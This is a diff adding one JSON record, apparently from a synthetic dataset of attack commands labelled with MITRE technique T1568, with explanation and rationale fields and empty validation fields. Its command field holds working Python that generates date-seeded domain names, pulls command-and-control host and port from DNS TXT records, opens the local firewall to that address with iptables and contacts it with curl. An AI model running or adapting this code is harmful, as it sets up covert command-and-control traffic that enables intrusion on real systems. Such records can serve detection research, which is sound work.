@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='txt-seed'; tlds=['org','com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.md5((base+str(i)).encode()).hexdigest()[:9]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; host=None; port=None; ip=None\nfor d in dga(25):\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='_cfg.'+d,qtype='TXT')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for rr in resp[DNS].an:\n            if getattr(rr,'type',0)==16:\n                try:\n                    txt=rr.rdata.decode() if isinstance(rr.rdata,bytes) else rr.rdata\n                except Exception:\n                    txt=str(rr.rdata)\n                if 'host=' in txt and 'port=' in txt:\n                    host=txt.split('host=')[1].split(',')[0].strip()\n                    port=int(txt.split('port=')[1].split(',')[0].strip())\n                    dom=d; break\n    if host and port: break\nif host and port:\n    r2=sr1(IP(dst='9.9.9.9')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=host,qtype='A')),timeout=3,verbose=0)\n    if r2 and r2[DNS] and r2[DNS].an:\n        for a in r2[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; break\nif ip:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{host}:{port}:{ip}',f'http://{host}:{port}/k'])\n    print(dom,host,ip,port)\"",
+  "explanation": "Uses a TXT record under a DGA subdomain to dynamically retrieve C2 host and port, then resolves and connects over that configuration.",
+  "rationale_steps": [
+    "Derive DGA domain list based on date and seed.",
+    "Query TXT records to pull C2 configuration (host and port).",
+    "Resolve the provided host to an IP using scapy.",
+    "Allow and probe the C2 IP:port via iptables and curl."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-da4dd9c4",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
